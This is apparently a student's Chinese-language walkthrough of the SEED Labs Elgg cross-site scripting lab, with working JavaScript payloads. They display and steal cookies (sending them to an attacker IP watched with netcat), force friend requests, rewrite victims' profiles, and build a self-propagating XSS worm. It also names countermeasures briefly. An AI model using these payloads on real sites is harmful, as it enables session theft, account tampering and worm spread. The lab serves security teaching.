# Cross-Site Scripting Attack

## Pre-Experiment

Cross-site scripting (XSS) 跨站脚本攻击. 

在缺乏对危险内容 (恶意代码片段等) 过滤的网站中, 可能存在恶意用户提交危险内容, 当正常用户浏览访问危险内容的时候, 自己的网页会被危险内容篡改. 

::: tip
Cross-site scripting 的英文首字母缩写本应为CSS, 但是吧, 所以将 Cross (意为"交叉") 改以交叉形的 X 做为缩写.
:::

[地址](https://seedsecuritylabs.org/Labs_16.04/Web/Web_XSS_Elgg/)

[实验指导](https://seedsecuritylabs.org/Labs_16.04/PDF/Web_XSS_Elgg.pdf)

[wiki](https://zh.wikipedia.org/wiki/跨網站指令碼)


- HTTP 
- JavaScript
- Ajax


在下载的 Ubuntu 中包含了一个名为 Elgg 的 Web 应用, 它在路径 `/var/www/XSS/Elgg/` 下, 本地浏览器访问 `http://www.xsslabelgg.com`, 实验指导中给出了相应的用户信息. 

为了方便测试, 可以打开两个虚拟机方便登上两个不同账号, 相互访问吗, 配置其中一个虚拟机的 `/etc/hosts` 将 `127.0.0.1` 修改为另一个虚拟机的 IP. 

<!-- 此外, 使用 `console.log` 来代替 `alert` 可能更好的体验.  -->

## T1 Posting a Malicious Message to Display an Alert Window

某个用户在自己的 profile 页面中输入一段 JS 片段, 其他用户访问此用户的 profile 页面时, JS 片段会被自动加载执行. 

``` HTML
<script>alert('XSS');</script>
```
::: warning 注意
实验指导中的单引号是非法字符. 
:::

## T2 Posting a Malicious Message to Display Cookies

在 T1 的基础上将单纯的 `alert` 修改为能够获取访问用户的 Cookies 的 JS 片段. 

``` HTML
<script>alert(document.cookie);</script>
```

还可以获取其他需要的有价值数据. 

## T3 Stealing Cookies from the Victim’s Machine

在 T2 中, 我们能够获取访问用户的 Cookies 数据, 但是作为攻击者, 这些数据是看不到的, 所以, 我们希望在获取数据之后直接发送给攻击者

作为攻击者, 我们可以利用系统中的 netcat 工具, 监听 5555 端口, 
``` sh
nc -l 5555 -v
```
同时在自己的 profile 页面中插入 (修改 src 中的 ip 为攻击者的 ip):
``` HTML
<script>
document.write('<img src = http://10.1.2.5:5555?c=' + escape(document.cookie) + ' >');
</script>
```
利用 `img` 标签, 受害者在获取 "图片" 时会自动发送不该发送的数据. 

## T4 Becoming the Victim’s Friend

让受害者直接添加攻击者为好友. 这里会用到很有年代感的 Ajax. 

首先需要尝试添加好友, 观察浏览器发送的请求. 可以得到:
``` http
http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1580819905&__elgg_token=8a8mQrbPSXQooe1smJqxkQ&__elgg_ts=1580819905&__elgg_token=8a8mQrbPSXQooe1smJqxkQ
```

这里参数 friend 是攻击者 ID, 也就是 Samy 的 ID, __elgg_ts 是什么不清楚, __elgg_token 是什么不清楚. 

拼装 JS . 
``` HTML
<script type="text/javascript">
    window.onload = function () { 
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        // 拼装请求 URL , 47 是 Samy 的 id
        var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=" + ts + "&__elgg_token=" + token + "&__elgg_ts=" + ts + "&__elgg_token=" + token; 
        // Ajax
        var Ajax=null;
        Ajax=new XMLHttpRequest(); 
        Ajax.open("GET",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com"); 
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); 
        Ajax.send();
    } 
</script>
```

::: tip
这一段内容应该放入到 Samy Profile 页面 about me 的文本框中, 并选择 HTML 模式输入, 默认的文本模式会在代码片段边上插入一些不该有的 HTML 内容. 
:::

例如 Alice 访问 Samy 的 profile 页面, 再到自己的 friend 页面中, 就会发现 "好友" Samy. 

## T5 Modifying the Victim’s Profile

修改受害者的 profile, 和 T4 对应, 这里需要用 Ajax 发送一个 POST 请求. 

在发送自己的 POST 请求之前, 我们需要查看修改 profile 时, 浏览器发送的请求, 尤其关注 DataForm. 

``` HTML {8,10,17}
<script type="text/javascript"> 
    window.onload = function() {
        var userName=elgg.session.user.name;
        var guid = "&guid=" + elgg.session.user.guid;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        // 组装需要 POST 的数据
        var content = 
            "__elgg_token=" + token + "&__elgg_ts=" + ts + "&name=" + userName + 
            "&description=&accesslevel[description]=2&briefdescription=;;;;;;;;;;;;;;;;" + 
            "&accesslevel[briefdescription]=2&location=&accesslevel[location]=2" + 
            "&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2" + 
            "&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2" + 
            "&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=" + 
            "&accesslevel[twitter]=2&guid=" + guid; 
        var samyGuid = 47; 
        if (elgg.session.user.guid != samyGuid) {
            var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
            // AJax
            var Ajax=null;
            Ajax = new XMLHttpRequest(); 
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content); 
        }
    }
</script>
```
8 行 content 就对应 POST 请求中的 DataForm, 可以将其中的 `briefdescription` (10 行) 修改为 `;;;;;;;;;;;;;;;;`, 这样, 用户访问 Samy 主页时, 自己的 profile 中的 description 会被修改为多个分号. 

17 行的 if 判断是为了防止 Samy 自己被自己攻击. 

## T6 Writing a Self-Propagating XSS Worm

编写 XSS 蠕虫加速传播. 我们需要让用户访问攻击者 profile 时, 自动加载运行危险的 JS 代码, 这段代码会修改访问者的 profile 并使其成为攻击者.  

结合 T1 中的操作, 可以将 T5 中的 JS 部分提取成一个 JS 文件, 比如 test.js 文件, 姑且放到 `/var/www/XSS/Elgg/` 路径下, 并对 content 部分进行修改,将分号替换成:
``` HTML
<script type='text/javascript' src='www.xsslabelgg.com/test.js'> </script>
```
我们希望在访问 Samy profile 页面时, test.js 可以被加载运行, test.js 的 content 部分被修改为:
``` JS {4}
var content = 
    "__elgg_token=" + token + "&__elgg_ts=" + ts + "&name=" + userName + 
    "&description=&accesslevel[description]=2" + 
    "&briefdescription=<script type='text/javascript' src='www.xsslabelgg.com/test.js'></script>" + 
    "&accesslevel[briefdescription]=2&location=&accesslevel[location]=2" + 
    "&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2" + 
    "&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2" + 
    "&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=" + 
    "&accesslevel[twitter]=2&guid=" + guid; 
```
Samy 自己的 profile 页面内的 description 也添加那段短短的 HTML 并提交. 

这时候, 让 Alice 访问 Samy, 他的 profile 会被修改, 同时他也具备了攻击他人的能力, 当 Boby 访问 Alice 主页的时候, 他的 profile 也会被修改也会成为一个新的攻击者. 

## T7 Countermeasures
实验项目自带了安全措施, 照做. Why

## 防御 XSS 攻击的建议

[美团技术团队-前端安全系列（一）：如何防止XSS攻击？](https://juejin.im/post/5bad9140e51d450e935c6d64)

### 过滤用户提交的内容

### 设置输入类型
